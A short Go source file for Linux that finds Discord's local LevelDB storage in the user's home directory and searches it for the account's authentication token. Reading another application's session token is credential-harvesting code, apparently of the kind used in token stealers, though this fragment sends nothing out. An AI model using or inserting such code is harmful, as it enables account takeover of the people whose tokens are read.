//+build linux

package token

import (
	"github.com/pkg/errors"
	"os"
	"path/filepath"
)

func GetToken() (tok string, err error) {
	home, def := os.LookupEnv("HOME")
	if !def {
		return "", errors.New("HOME path wasn't specified in environment")
	}
	path := filepath.Join(home, ".config/discord/Local Storage/leveldb")

	return searchLevelDB(path)
}
